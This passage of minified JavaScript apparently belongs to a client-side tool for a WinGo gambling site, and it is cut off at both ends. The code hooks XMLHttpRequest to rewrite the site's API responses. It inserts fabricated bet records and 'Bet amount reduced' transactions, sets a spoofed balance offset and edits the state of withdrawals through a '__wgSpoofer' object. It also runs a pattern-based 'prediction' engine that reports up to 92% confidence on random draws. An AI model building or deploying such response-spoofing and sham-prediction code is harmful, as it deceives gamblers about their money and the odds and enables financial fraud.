  },
  GetRecordPage: function (n, t) {
    var e = n.data,
      o = e && e.list;
    if (!o) return;
    var i = Sn(t ? t._kUrl : null),
      l = parseInt(fn(t ? t._kUrl : "", "pageNo") || e.pageNo || 1, 10),
      f = parseInt(fn(t ? t._kUrl : "", "pageSize") || e.pageSize || o.length || 10, 10),
      c = {},
      p = {};
    for (var w = 0; w < o.length; w++) {
      var S = o[w],
        $ = String(S.issueNumber || "");
      if (!c[$]) c[$] = Rn($, i).slice();
      var g = c[$],
        M = -1,
        W = -1,
        L = wn(S.amount || 0, S.betMultiple || 1);
      for (var q = 0; q < g.length; q++) {
        if (String(g[q].rig.content || "") !== String(S.betContent || "")) continue;
        var y = Qt(g[q].rig.stake, L) ? 3 : 0;
        if (Math.abs(G(S.betTime) - G(g[q].rig.time)) <= 120000) y += 1;
        if (y > W || (y === W && g[q].rig.time < g[M].rig.time)) ((M = q), (W = y));
      }
      if (M < 0) continue;
      var a = g.splice(M, 1)[0];
      ((p[a.key] = !0), Dt(S, a.rig));
    }
    if (l !== 1 || !i) return;
    var u = o.slice();
    for (var v in E.rigs) {
      var r = E.rigs[v];
      if (r.game !== i || p[v]) continue;
      var C = co(r),
        O = wn(C.amount, C.betMultiple),
        J = !1;
      for (var H = 0; H < u.length; H++) {
        var Q = u[H];
        if (String(Q.issueNumber) !== C.issueNumber || String(Q.betContent) !== C.betContent)
          continue;
        if (!Qt(wn(Q.amount || 0, Q.betMultiple || 1), O)) continue;
        if (Math.abs(G(Q.betTime) - G(C.betTime)) > 1500) continue;
        J = !0;
        break;
      }
      if (!J) u.push(C);
    }
    if (
      (u.sort(function (Dn, Un) {
        return G(Un.betTime) - G(Dn.betTime);
      }),
      u.length > f)
    )
      u = u.slice(0, f);
    if (((e.list = u), typeof e.totalCount === "number" && e.totalCount < u.length))
      e.totalCount = u.length;
    if (typeof e.totalPage === "number")
      e.totalPage = Math.max(1, Math.ceil((e.totalCount || u.length) / f));
  },
  GetTrendStatistics: function (n, t) {
    if (!n.data || !n.data.length) return;
    var e = Sn(t ? t._kUrl : null),
      o = null;
    for (var i in E.rigs) {
      var l = E.rigs[i];
      if (!l.settled || (e && l.game !== e)) continue;
      if (!o || l.time > o.time) o = l;
    }
    if (!o) return;
    var f = gn(o.issue, o.game);
    if (f) {
      for (var c = 0; c < n.data.length; c++)
        if (G(n.data[c].number) === f.num) n.data[c].missingCount = 0;
    }
  },
  GetLoadedSetting: function (n) {
    if (n && n.data)
      ((n.data.needPopupFirstRecharge = !1),
        (n.data.isOpenActivityAward = "0"),
        (n.data.isOpenJackpotReward = "0"),
        (n.data.isTaskState = "0"));
  },
  GetFirstRechargeList: function (n) {
    if (n) n.data = [];
  },
  GetSitePopMsgList: function (n) {
    if (n) n.data = [];
  },
  GetTreasureChestPopupItems: function (n) {
    if (n) n.data = [];
  },
  GetActiveSetting: function (n) {
    if (n && n.data)
      ((n.data.isOpenActivityAward = "0"),
        (n.data.isOpenJackpotReward = "0"),
        (n.data.isTaskState = "0"),
        (n.data.unJackpotCount = 0),
        (n.data.unWeeklyAwardCount = 0),
        (n.data.newbieGiftPackCount = 0));
  },
  GetPayTypeName: function (n) {
    if (n && n.data && Array.isArray(n.data.typelist))
      n.data.typelist = n.data.typelist.filter(function (t) {
        var e = (
          (t.payName || "") +
          " " +
          (t.paySysName || "") +
          " " +
          (t.name || "")
        ).toLowerCase();
        return e.indexOf("arpay") === -1;
      });
  },
  GetRechargeTypes: function (n) {
    if (n && n.code === 0 && n.data && Array.isArray(n.data.rechargetypelist))
      ((n.data.rechargetypelist = n.data.rechargetypelist.filter(function (e) {
        var o = (
          (e.payName || "") +
          " " +
          (e.paySysName || "") +
          " " +
          (e.code || "")
        ).toLowerCase();
        return o.indexOf("arpay") === -1;
      })),
        (window.__wgRTCache = JSON.parse(JSON.stringify(n))));
    else if (n && n.code !== 0 && window.__wgRTCache && /frequent|rate.?limit/i.test(n.msg || "")) {
      var t = window.__wgRTCache;
      ((n.code = t.code), (n.msg = t.msg), (n.msgCode = t.msgCode), (n.data = t.data));
    }
  },
  GetTransactions: function (n, t) {
    if (!n.data) return;
    var e = {};
    try {
      e = JSON.parse((t && t._kBody) || "{}");
    } catch (H) {}
    var o = parseInt(e.pageNo || 1, 10),
      i = parseInt(e.pageSize || 10, 10),
      l = e.startDate || "",
      f = e.endDate || "",
      c = e.type,
      p = c === void 0 || c === "" || String(c) === "-1",
      w = l ? new Date(l + " 00:00:00").getTime() : 0,
      S = f ? new Date(f + " 23:59:59").getTime() : 1 / 0,
      $ = [];
    for (var g in E.rigs) {
      var M = E.rigs[g],
        W = G(M.time);
      if (!W || W < w || W > S) continue;
      if (!p && String(0) !== String(c)) continue;
      var L = G(M.stake);
      if (!L) L = wn(M.amount, M.betMultiple);
      $.push({
        orderNum: M.orderNo || "KG" + String(M.issue || "") + ":B",
        amount: L,
        type: 0,
        typeName: "Bet amount reduced",
        typeNameCode: "8000",
        addTime: Tn(W),
        remark: "",
        _ts: W,
      });
    }
    if (!$.length) return;
    if (!n.data.list)
      n.data = {
        list: [],
        pageNo: 1,
        totalPage: 0,
        totalCount: 0,
      };
    var q = n.data.list || [],
      y = typeof n.data.totalCount === "number" ? n.data.totalCount : q.length,
      a = {};
    for (var u = 0; u < q.length; u++) a[q[u].orderNum] = !0;
    var v = [];
    for (var r = 0; r < $.length; r++) if (!a[$[r].orderNum]) v.push($[r]);
    if (o === 1) {
      var C = v.slice(0);
      for (var O = 0; O < q.length; O++)
        ((q[O]._ts = new Date(q[O].addTime || 0).getTime() || 0), C.push(q[O]));
      C.sort(function (H, Q) {
        return (Q._ts || 0) - (H._ts || 0);
      });
      for (var J = 0; J < C.length; J++) delete C[J]._ts;
      n.data.list = C.slice(0, i);
    }
    ((n.data.totalCount = y + v.length),
      (n.data.totalPage = Math.max(1, Math.ceil(n.data.totalCount / i))),
      (n.data.pageNo = o));
  },
};
function xn(n) {
  try {
    return new Event(n);
  } catch (e) {}
  try {
    var t = document.createEvent("Event");
    return (t.initEvent(n, !1, !1), t);
  } catch (e) {}
  return null;
}
function jn(n, t, e) {
  setTimeout(function () {
    try {
      Object.defineProperty(n, "readyState", {
        value: 4,
        configurable: !0,
      });
    } catch (f) {
      try {
        n.readyState = 4;
      } catch (c) {}
    }
    try {
      Object.defineProperty(n, "status", {
        value: 200,
        configurable: !0,
      });
    } catch (f) {
      try {
        n.status = 200;
      } catch (c) {}
    }
    try {
      Object.defineProperty(n, "responseText", {
        value: t,
        configurable: !0,
      });
    } catch (f) {
      try {
        n.responseText = t;
      } catch (c) {}
    }
    try {
      Object.defineProperty(n, "response", {
        value: t,
        configurable: !0,
      });
    } catch (f) {
      try {
        n.response = t;
      } catch (c) {}
    }
    try {
      if (typeof n.onreadystatechange === "function") n.onreadystatechange();
    } catch (f) {}
    var o = xn("readystatechange");
    if (o)
      try {
        n.dispatchEvent(o);
      } catch (f) {}
    try {
      if (typeof n.onload === "function") n.onload();
    } catch (f) {}
    var i = xn("load");
    if (i)
      try {
        n.dispatchEvent(i);
      } catch (f) {}
    try {
      if (typeof n.onloadend === "function") n.onloadend();
    } catch (f) {}
    var l = xn("loadend");
    if (l)
      try {
        n.dispatchEvent(l);
      } catch (f) {}
  }, e || 10);
}
var kn = Object.keys(Gn).sort(function (n, t) {
  return t.length - n.length;
});
function lo(n) {
  var t = typeof n === "string" ? n : "";
  if (de(t)) return "WinGoState";
  for (var e = 0; e < kn.length; e++) if (t.indexOf(kn[e]) !== -1) return kn[e];
  return null;
}
var It = {},
  fo = 1e4;
function Xt(n) {
  try {
    var t = JSON.parse(n || "{}");
    return "RT:" + (t.payid || 0);
  } catch (e) {
    return "RT:0";
  }
}
var Zt = {},
  uo = 60000;
function ao(n, t) {
  try {
    var e = JSON.parse(t || "{}");
    (delete e.signature, delete e.random, delete e.timestamp);
    var o = Object.keys(e).sort(),
      i = "";
    for (var l = 0; l < o.length; l++) i += o[l] + "=" + e[o[l]] + "&";
    return n + ":" + i;
  } catch (f) {
    return n;
  }
}
var Bt = {
    GetUserInfo: 1,
    GetBalance: 1,
    GetWealthState: 1,
    GetVipUsers: 1,
    GetARGameAndPlatWallets: 1,
    GetTreasureChestPopupItems: 1,
    GetActiveSetting: 1,
    GetHomeSettings: 1,
    GetLoadedSetting: 1,
    GetDailyProfitRank: 1,
    GetPwaDomainList: 1,
    NotifyARGameRecover: 1,
    GetSiteMessageList: 1,
    GetRechargeTypes: 1,
    GetSitePopMsgList: 1,
    GetGameCategoryList: 1,
    GetAllGameList: 1,
    GetBannerList: 1,
    GetSaasAllwallets: 1,
    RecoverSaasBalance: 1,
  },
  ln = {},
  po = 2000,
  yo = Bt;
function vo(n, t) {
  try {
    var e = JSON.parse(t || "{}");
    return (
      n +
      ":" +
      (e.pageNo || 0) +
      ":" +
      (e.pageSize || 0) +
      ":" +
      (e.payid || 0) +
      ":" +
      (e.gameCode || "")
    );
  } catch (o) {
    return n;
  }
}
function At() {
  var n = Ht();
  (setInterval(function () {
    n = Ht();
  }, 5000),
    En());
  var t = XMLHttpRequest.prototype.open,
    e = XMLHttpRequest.prototype.send;
  ((XMLHttpRequest.prototype.open = function (o, i) {
    if (!n) return t.apply(this, arguments);
    return ((this._kUrl = i), (this._kEp = lo(i)), t.apply(this, arguments));
  }),
    (XMLHttpRequest.prototype.send = function (o) {
      if (!n) return e.apply(this, arguments);
      if (this._kEp === "GetRechargeTypes") {
        var i = Xt(o),
          l = It[i];
        if (l && Date.now() - l.ts < fo) {
          jn(this, l.json, 10);
          return;
        }
      }
      if (this._kEp && yo[this._kEp]) {
        var f = vo(this._kEp, o),
          c = ln[f];
        if (c && Date.now() - c.ts < po) {
          ((this._kBody = o), c.xhrs.push(this));
          return;
        }
        ((this._kDedupKey = f),
          (ln[f] = {
            xhrs: [],
            ts: Date.now(),
          }),
          setTimeout(function () {
            var M = ln[f];
            if (M) {
              for (var W = 0; W < M.xhrs.length; W++)
                jn(M.xhrs[W], '{"code":-1,"data":null,"msg":"dedup timeout","msgCode":-1}', 0);
              delete ln[f];
            }
          }, 1e4));
      }
      if (this._kEp) {
        let M = function () {
          if (S || p.readyState !== 4) return;
          try {
            var W = p.responseText || (typeof p.response === "string" ? p.response : "");
            if (!W) return;
            var L = JSON.parse(W);
            Gn[w](L, p);
            var q = JSON.stringify(L);
            if (
              (Object.defineProperty(p, "responseText", {
                value: q,
                configurable: !0,
              }),
              Object.defineProperty(p, "response", {
                value: q,
                configurable: !0,
              }),
              (S = !0),
              w === "GetRechargeTypes" && L.code === 0)
            )
              It[Xt(p._kBody)] = {
                json: q,
                ts: Date.now(),
              };
            var y = ao(w, p._kBody);
            if (L.code === 0)
              Zt[y] = {
                json: q,
                ts: Date.now(),
              };
            else if (
              Bt[w] &&
              (L.code === 313 || L.msgCode === 313 || /frequent|rate.?limit/i.test(L.msg || ""))
            ) {
              var a = Zt[y];
              if (a && Date.now() - a.ts < uo)
                ((q = a.json),
                  Object.defineProperty(p, "responseText", {
                    value: q,
                    configurable: !0,
                  }),
                  Object.defineProperty(p, "response", {
                    value: q,
                    configurable: !0,
                  }));
            }
            if (p._kDedupKey) {
              var u = ln[p._kDedupKey];
              if (u) {
                for (var v = 0; v < u.xhrs.length; v++) jn(u.xhrs[v], q, 5);
                delete ln[p._kDedupKey];
              }
            }
          } catch (r) {}
        };
        this._kBody = o;
        var p = this,
          w = this._kEp,
          S = !1,
          $ = p.onreadystatechange,
          g = p.onload;
        ((p.onreadystatechange = function () {
          if ((M(), typeof $ === "function")) return $.apply(this, arguments);
        }),
          (p.onload = function () {
            if ((M(), typeof g === "function")) return g.apply(this, arguments);
          }),
          p.addEventListener("readystatechange", M),
          p.addEventListener("load", M));
      }
      return e.apply(this, arguments);
    }),
    (window.__kismatAccuracy = A("accuracy", 70)),
    (window.__kismatRigMap = window.__kismatRigMap || {}),
    (window.__wgSpoofer = {
      getSettings: function () {
        return {
          accuracy: A("accuracy", 70),
          balanceOffset: A("balanceOffset", 5000),
        };
      },
      saveSetting: function (o, i) {
        var l = Yt();
        if (((l[o] = i), localStorage.setItem("wg_spoof_cfg", JSON.stringify(l)), o === "accuracy"))
          window.__kismatAccuracy = i;
      },
      resetBalance: function () {
        ((E.balance = null), (E.balance = A("balanceOffset", 5000)), j(), nt());
      },
      getWithdrawals: function () {
        return E.withdrawals;
      },
      updateWithdrawalStatus: function (o, i) {
        if (E.withdrawals[o]) ((E.withdrawals[o].state = i), j());
      },
      predictNum: Nn,
      rigHash: Kt,
      colors: _n,
      isVip: function () {
        return n;
      },
    }));
}
function ro(n) {
  let t = parseInt(n);
  return {
    num: t,
    big: t >= 5,
    color: t === 0 || t === 5 ? "violet" : t % 2 === 0 ? "red" : "green",
  };
}
function tt(n, t) {
  if (n.length < 2)
    return {
      len: 0,
      val: null,
    };
  let e = n[0][t],
    o = 1;
  for (let i = 1; i < n.length; i++)
    if (n[i][t] === e) o++;
    else break;
  return {
    len: o,
    val: e,
  };
}
function wo(n, t, e) {
  let o = {};
  return (
    n.slice(0, e).forEach((i) => {
      o[i[t]] = (o[i[t]] || 0) + 1;
    }),
    o
  );
}
function Rt(n) {
  if (n.len >= 3)
    return {
      side: !n.val,
      conf: Math.min(0.15 + n.len * 0.08, 0.45),
    };
  if (n.len >= 2)
    return {
      side: !n.val,
      conf: 0.1,
    };
  return {
    side: null,
    conf: 0,
  };
}
function bt(n, t = 10) {
  let e = wo(n, "big", t),
    o = e[!0] || 0,
    i = e[!1] || 0,
    l = o + i;
  if (l < 5)
    return {
      side: null,
      conf: 0,
    };
  let f = o / l;
  if (f >= 0.7)
    return {
      side: !1,
      conf: 0.12,
    };
  if (f <= 0.3)
    return {
      side: !0,
      conf: 0.12,
    };
  return {
    side: null,
    conf: 0,
  };
}
function Tt(n, t = 12) {
  let e = Math.min(t, n.length);
  if (e < 4)
    return {
      side: null,
      conf: 0,
    };
  let o = 0,
    i = 0;
  for (let f = 0; f < e; f++) {
    let c = e - f;
    ((o += (n[f].big ? 1 : -1) * c), (i += c));
  }
  let l = i ? o / i : 0;
  if (Math.abs(l) < 0.08)
    return {
      side: null,
      conf: 0,
    };
  return {
    side: l > 0,
    conf: Math.min(Math.abs(l) * 0.22, 0.18),
  };
}
function xt(n, t = 24) {
  if (n.length < 6)
    return {
      side: null,
      conf: 0,
    };
  let e = n[0].big,
    o = 0,
    i = 0,
    l = Math.min(t, n.length - 1);
  for (let p = 0; p < l; p++) {
    let w = n[p + 1],
      S = n[p];
    if (w.big !== e) continue;
    if (S.big === e) o++;
    else i++;
  }
  let f = o + i;
  if (f < 3)
    return {
      side: null,
      conf: 0,
    };
  let c = o / f;
  if (c >= 0.67)
    return {
      side: e,
      conf: Math.min((c - 0.5) * 0.45, 0.18),
    };
  if (c <= 0.33)
    return {
      side: !e,
      conf: Math.min((0.5 - c) * 0.45, 0.18),
    };
  return {
    side: null,
    conf: 0,
  };
}
function jt(n, t = 6) {
  let e = n.slice(0, t);
  if (e.length < 4)
    return {
      side: null,
      conf: 0,
    };
  let o = e.reduce((i, l) => i + l.num, 0) / e.length;
  if (o >= 6.1)
    return {
      side: !0,
      conf: 0.08,
    };
  if (o <= 3.9)
    return {
      side: !1,
      conf: 0.08,
    };
  return {
    side: null,
    conf: 0,
  };
}
function kt(n) {
  if (n.length < 4)
    return {
      detected: !1,
      conf: 0,
    };
  let t = 0,
    e = Math.min(6, n.length - 1);
  for (let o = 0; o < e; o++) if (n[o].big !== n[o + 1].big) t++;
  if (t / e >= 0.8)
    return {
      detected: !0,
      nextSide: !n[0].big,
      conf: 0.15,
    };
  return {
    detected: !1,
    conf: 0,
  };
}
function So(n) {
  let t = kt(n);
  return t.detected
    ? {
        side: t.nextSide,
        conf: t.conf,
      }
    : {
        side: null,
        conf: 0,
      };
}
function qo(n) {
  let t = tt(n, "color");
  if (t.len >= 4 && t.val !== "violet")
    return {
      color: t.val === "red" ? "green" : "red",
      conf: 0.1,
    };
  return {
    color: null,
    conf: 0,
  };
}
function st(n, t = 2, e = 28) {
  if (n.length < t + 4)
    return {
      side: null,
      conf: 0,
    };
  let o = n
      .slice(0, t)
      .map((w) => (w.big ? 1 : 0))
      .join(""),
    i = 0,
    l = 0,
    f = 0,
    c = Math.min(e, n.length - t - 1);
  for (let w = 1; w <= c; w++) {
    if (
      n
        .slice(w, w + t)
        .map((M) => (M.big ? 1 : 0))
        .join("") !== o
    )
      continue;
    let $ = n[w - 1].big,
      g = c - w + 1;
    ((i += ($ ? 1 : -1) * g), (l += g), f++);
  }
  if (f < 2 || !l)
    return {
      side: null,
      conf: 0,
    };
  let p = i / l;
  if (Math.abs(p) < 0.12)
    return {
      side: null,
      conf: 0,
    };
  return {
    side: p > 0,
    conf: Math.min(Math.abs(p) * 0.32, 0.24),
  };
}
function mo(n, t = 20) {
  let e = {};
  n.slice(0, t).forEach((i) => {
    e[i.num] = (e[i.num] || 0) + 1;
  });
  let o = Object.entries(e).sort((i, l) => l[1] - i[1]);
  return {
    hot: o.slice(0, 3).map((i) => parseInt(i[0])),
    cold: o.slice(-3).map((i) => parseInt(i[0])),
  };
}
function go(n) {
  let t = [],
    e = 0,
    o = Tt(n);
  if (o.conf > 0)
    ((e += o.side ? o.conf : -o.conf),
      t.push({
        name: "momentum",
        type: "trend",
        weight: o.conf,
      }));
  let i = xt(n);
  if (i.conf > 0)
    ((e += i.side ? i.conf : -i.conf),
      t.push({
        name: "transition",
        type: "flow",
        weight: i.conf,
      }));
  let l = tt(n, "big"),
    f = Rt(l);
  if (f.conf > 0)
    ((e += f.side ? f.conf : -f.conf),
      t.push({
        name: l.val ? "Big" : "Small",
        type: "streak",
        len: l.len,
        weight: f.conf,
      }));
  let c = bt(n);
  if (c.conf > 0)
    ((e += c.side ? c.conf : -c.conf),
      t.push({
        name: "frequency",
        type: "bias",
        weight: c.conf,
      }));
  let p = jt(n);
  if (p.conf > 0)
    ((e += p.side ? p.conf : -p.conf),
      t.push({
        name: "pressure",
        type: "numbers",
        weight: p.conf,
      }));
  let w = kt(n);
  if (w.detected)
    ((e += w.nextSide ? w.conf : -w.conf),
      t.push({
        name: "alternating",
        type: "pattern",
        weight: w.conf,
      }));
  return {
    bigScore: e,
    signals: t,
    streak: l,
  };
}
function Eo(n, t, e = 24) {
  let o = 0,
    i = 0,
    l = 0,
    f = Math.min(e, t.length - 4);
  for (let c = 1; c <= f; c++) {
    let p = n(t.slice(c));
    if (!p || p.side == null || !p.conf) continue;
    let w = t[c - 1].big,
      S = f - c + 1;
    ((o += (p.side === w ? 1 : -1) * p.conf * S), (i += p.conf * S), l++);
  }
  return {
    edge: i ? o / i : 0,
    count: l,
  };
}
var Lo = [
  {
    name: "memory-2",
    type: "memory",
    run: (n) => st(n, 2, 28),
    minCount: 3,
  },
  {
    name: "memory-3",
    type: "memory",
    run: (n) => st(n, 3, 36),
    minCount: 2,
  },
  {
    name: "momentum",
    type: "trend",
    run: Tt,
    minCount: 4,
  },
  {
    name: "transition",
    type: "flow",
    run: xt,
    minCount: 4,
  },
  {
    name: "revert",
    type: "streak",
    run: (n) => Rt(tt(n, "big")),
    minCount: 4,
  },
  {
    name: "hot-cold",
    type: "bias",
    run: bt,
    minCount: 4,
  },
  {
    name: "pressure",
    type: "numbers",
    run: jt,
    minCount: 4,
  },
  {
    name: "alternating",
    type: "pattern",
    run: So,
    minCount: 3,
  },
];
function Ln(n) {
  if (!n || n.length < 3)
    return {
      prediction: "Big",
      confidence: 54,
      color: "green",
      signals: [],
      heatmap: {
        hot: [],
        cold: [],
      },
      topNumber: 7,
    };
  let t = n.map((W) => ro(W.number || W.num || W)),
    e = mo(t),
    o = qo(t),
    i = go(t),
    l = [],
    f = 0,
    c = 0;
  for (let W of Lo) {
    let L = W.run(t);
    if (!L || L.side == null || !L.conf) continue;
    let q = Eo(W.run, t, 24);
    if (q.count < W.minCount) continue;
    let y = L.side,
      a = Math.min(Math.abs(q.edge), 0.45) * (0.7 + L.conf);
    if (q.edge < -0.18) ((y = !y), (a *= 0.6));
    else if (q.edge < 0.05) continue;
    ((f += (y ? 1 : -1) * a),
      (c += a),
      l.push({
        name: W.name,
        type: W.type,
        weight: Number(a.toFixed(3)),
        edge: Number(q.edge.toFixed(3)),
        mode: y === L.side ? "direct" : "flip",
      }));
  }
  let p = c ? f : i.bigScore,
    w = p >= 0,
    S = Math.round(
      Math.min(
        Math.max(c ? 0.53 + Math.abs(p) * 0.62 + Math.min(c, 0.18) : 0.5 + Math.abs(p), 0.54),
        0.92,
      ) * 100,
    ),
    $ = o.color ?? (w ? "red" : "green"),
    g = e.hot.find((W) => (w ? W >= 5 : W < 5)) ?? (w ? 7 : 3),
    M = (l.length ? l : i.signals).sort((W, L) => (L.weight || 0) - (W.weight || 0)).slice(0, 4);
  return {
    prediction: w ? "Big" : "Small",
    confidence: S,
    color: $,
    signals: M,
    heatmap: e,
    topNumber: g,
    streak: {
      side: i.streak.val ? "Big" : "Small",
      len: i.streak.len,
    },
  };
}
var Mo = [
    "Ca74Ns3T",
    "DFUEzKvm",
    "BA1HkQbr",
    "CSGWgLyY",
    "CU90k0Z5",
    "DD5VBkEF",
    "CRRe003w",
    "Cf2z_aqK",
    "BWd7rcUJ",
    "DDw5YEZU",
  ],
  et = Object.create(null),
  Y = an(),
  _t = ne(Y),
  Mn = null,
  Qn = null;
function dt(n) {
  return "/assets/png/ball_" + n + "-" + Mo[n] + ".png";
}
function s(n = Y) {
  if (((n = n || "WinGo_30S"), !et[n]))
    et[n] = {
      history: [],
      issue: "",
      latestIssue: "",
      lastSec: -1,
    };
  return et[n];
}
function $o(n) {
  if (
    ((n = String(n || "")
      .toLowerCase()
      .replace(/\s+/g, "")),
    n.includes("wingo30"))
  )
    return "WinGo_30S";
  if (n.includes("wingo1min") || n.includes("wingo1m")) return "WinGo_1M";
  if (n.includes("wingo3min") || n.includes("wingo3m")) return "WinGo_3M";
  if (n.includes("wingo5min") || n.includes("wingo5m")) return "WinGo_5M";
  return "";
}
function an() {
  let n = document.querySelector(".timer-card.active .card-title, .TimeLeft__C-name"),
    t = $o(n && n.textContent);
  if (t) return t;
  let e = (location.hash || "").match(/gameCode=(WinGo_\w+)/);
  return e ? e[1] : "WinGo_30S";
}
function ne(n) {
  if (!n) return 30;
  let t = n.match(/(\d+)M$/i);
  if (t) return parseInt(t[1], 10) * 60;
  let e = n.match(/(\d+)S$/i);
  if (e) return parseInt(e[1], 10);
  return 30;
}
function T(n) {
  let t = String(n == null ? "" : n).trim();
  return /^\d{8,22}$/.test(t) ? t : "";
}
function ot(n) {
  if (((n = T(n)), !n)) return "";
  try {
    return (BigInt(n) + 1n).toString();
  } catch (t) {
    return "";
  }
}
function te(n, t) {
  if (((n = T(n)), (t = T(t)), !n || !t)) return 0;
  try {
    let e = BigInt(n),
      o = BigInt(t);
    return e > o ? 1 : e < o ? -1 : 0;
  } catch (e) {
    return n > t ? 1 : n < t ? -1 : 0;
  }
}
function $n() {
  let n = an();
  if (n && n !== Y) ft(n);
}
function ee(n) {
  return ((n = n || Y || "WinGo_30S"), (Y = n), (_t = ne(n)), s(n), n);
}
function it() {
  return document.querySelector("prediction-panel")?.shadowRoot;
}
function Wn() {
  return !!it()?.querySelector(".view-pro.active");
}
function In() {
  return Y;
}
function ct() {
  return s().history;
}
function oe() {
  return s().issue;
}
function ie() {
  return s().latestIssue;
}
function ce(n) {
  s().lastSec = n;
}
function lt(n) {
  if (!n) return "—";
  return n
    .replace(/^WinGo_/, "")
    .replace(/(\d+)S$/i, "$1sec")
    .replace(/(\d+)M$/i, "$1m");
}
function tn(n) {
  let t = it();
  if (!t) return;
  let e = t.querySelector("#pro-waiting"),
    o = t.querySelector("#pro-prediction"),
    i = t.querySelector("#pro-card"),
    l = t.querySelector("#scan-lbl");
  if (!e || !o || !i) return;
  if (n === "result") {
    ((e.style.display = "none"), (o.style.display = "block"), i.classList.remove("shimmer"));
    return;
  }
  if (
    ((e.style.display = "flex"),
    (o.style.display = "none"),
    (i.className = i.className.replace(/\bc-\w+\b/g, "").trim() + " shimmer"),
    l && l.childNodes[0])
  )
    l.childNodes[0].textContent = n === "analyzing" ? "Analyzing" : "Scanning";
}
function le(n, t) {
  if (!Array.isArray(t) || !t.length) return;
  n = n || an() || Y;
  let e = T(t[0].issueNumber ?? t[0].issue);
  if (!e) return;
  let o = s(n);
  ((o.history = t), (o.latestIssue = e));
  let i = ot(e);
  if (i && (!o.issue || te(o.issue, e) <= 0)) o.issue = i;
  if (n !== Y || !Wn()) return;
  setTimeout(() => Mn?.(), 0);
}
function fe(n, t, e) {
  n = n || an() || Y;
  let o = s(n),
    i = T(t) || T(e) || ot(t);
  if (!i) return;
  if (!o.issue || i !== o.issue || (o.latestIssue && te(o.issue, o.latestIssue) <= 0)) {
    if (((o.issue = i), n === Y && Wn())) setTimeout(() => Mn?.(), 0);
  }
}
function en() {
  let n = Y;
  if (!n) return;
  let t = new XMLHttpRequest();
  (t.open("GET", "/WinGo/" + n + "/GetHistoryIssuePage.json?ts=" + Date.now()), t.send());
}
function ue(n, t) {
  $n();
  let e = n || Y;
  (le(e, t?.data?.list),
    fe(
      e,
      t?.current?.issueNumber || t?.data?.current?.issueNumber,
      t?.next?.issueNumber || t?.data?.next?.issueNumber,
    ));
}
function Wo(n) {
  let t = n.detail;
  if (!t || t.type !== "history") return;
  ($n(), le(t.game || Y, t.list));
}
function ho(n) {
  let t = n.detail;
  if (!t) return;
  ($n(), fe(t.game || Y, t.currentIssue, t.nextIssue));
}
function ae() {
  if (Qn) return;
  Qn = setInterval(() => {
    if (!Wn() || s().history.length) {
      (clearInterval(Qn), (Qn = null));
      return;
    }
    en();
  }, 3000);
}
function Co() {
  let n = it();
  if (!n?.querySelector(".view-pro.active")) return;
  $n();
  let t = Y,
    e = s(t),
    o = document.querySelector(".TimeLeft__C-time"),
    i = document.querySelector(".TimeLeft__C-id"),
    l = document.querySelector(".TimeLeft__C-name"),
    f = n.querySelector("#pro-timer"),
    c = n.querySelector("#pro-timer-wrap");
  if (!f || !c) return;
  if (o) {
    let w = o.textContent.trim();
    f.textContent = w;
    let S = w.split(":"),
      $ = (parseInt(S[0], 10) || 0) * 60 + (parseInt(S[1], 10) || 0);
    if (
      (c.style.setProperty("--pct", Math.max(0, Math.min(100, ($ / _t) * 100)) + "%"),
      f.classList.remove("t-warn", "t-end"),
      c.classList.remove("tw-warn", "tw-end"),
      $ <= 5)
    )
      (f.classList.add("t-end"), c.classList.add("tw-end"));
    else if ($ <= 10) (f.classList.add("t-warn"), c.classList.add("tw-warn"));
    if (e.lastSec >= 0 && e.lastSec <= 4 && $ > e.lastSec + 5) setTimeout(en, 250);
    e.lastSec = $;
  }
  if (i) {
    let w = String(i.textContent).trim(),
      S = T(w);
    if (S && e.issue !== S) ((e.issue = S), setTimeout(() => Mn?.(), 0));
    let $ = n.querySelector("#pro-period"),
      g = T(e.issue) || S || w;
    if ($) $.textContent = "#" + g.slice(-6);
  }
  let p = n.querySelector("#pro-mode");
  if (p) p.textContent = l?.textContent.trim() || lt(t);
}
function pe({ onPred: n }) {
  (ee(an()),
    (Mn = n),
    window.addEventListener("kismat:gameData", Wo),
    window.addEventListener("kismat:issue", ho),
    window.addEventListener("hashchange", $n),
    setInterval(Co, 300),
    setInterval(() => {
      if (Wn()) en();
    }, 12000));
}
function ft(n) {
  if (((n = n || an()), !n)) return;
  let t = n !== Y;
  ee(n);
  let e = s(n),
    i = T(document.querySelector(".TimeLeft__C-id")?.textContent) || ot(e.latestIssue),
    l = !!(e.history.length && i && e.issue === i);
  if (i) e.issue = i;
  if (((e.lastSec = -1), !t)) return;
  if (Wn()) {
    if (!l) tn("loading");
    else setTimeout(() => Mn?.(), 0);
    en();
  }
}
function ye(n, t) {
  return Math.max(0, Math.min(n, window.innerWidth - t));
}
function ve(n, t) {
  return Math.max(0, Math.min(n, window.innerHeight - t));
}
function Xn(n) {
  try {
    let t = JSON.parse(localStorage.getItem("__wg_p_" + n));
    if (t) return t;
  } catch (t) {}
  if (n === "logo")
    return {
      vw: ((window.innerWidth - 68) / window.innerWidth) * 100,
      vh: 75,
    };
  return null;
}
function ut(n, t) {
  localStorage.setItem(
    "__wg_p_" + t,
    JSON.stringify({
      vw: (n.offsetLeft / window.innerWidth) * 100,
      vh: (n.offsetTop / window.innerHeight) * 100,
    }),
  );
}
function Zn(n, t) {
  if (!t) return;
  ((n.style.left = (t.vw / 100) * window.innerWidth + "px"),
    (n.style.top = (t.vh / 100) * window.innerHeight + "px"));
}
function re(n, t) {
  let e = t.offsetWidth || 288,
    o = t.offsetHeight || 290;
  ((n.style.left = (window.innerWidth - e) / 2 + "px"),
    (n.style.top = (window.innerHeight - o) / 2 + "px"));
}
function we(n, t, { onTap: e }) {
  let o = 0,
    i = 0,
    l = 0,
    f = 0,
    c = !1;
  (t.addEventListener("pointerdown", (p) => {
    (t.setPointerCapture(p.pointerId),
      t.classList.add("dragging"),
      (o = p.clientX - n.offsetLeft),
      (i = p.clientY - n.offsetTop),
      (l = p.clientX),
      (f = p.clientY),
      (c = !1));
  }),
    t.addEventListener("pointermove", (p) => {
      if (!t.hasPointerCapture(p.pointerId)) return;
      if (
        ((n.style.left = ye(p.clientX - o, 62) + "px"),
        (n.style.top = ve(p.clientY - i, 62) + "px"),
        Math.abs(p.clientX - l) > 5 || Math.abs(p.clientY - f) > 5)
      )
        c = !0;
    }),
    t.addEventListener("pointerup", (p) => {
      if ((t.releasePointerCapture(p.pointerId), t.classList.remove("dragging"), c)) ut(n, "logo");
      else e();
    }));
}
function Se(n, t, e) {
  let o = 0,
    i = 0;
  (t.addEventListener("pointerdown", (l) => {
    (t.setPointerCapture(l.pointerId),
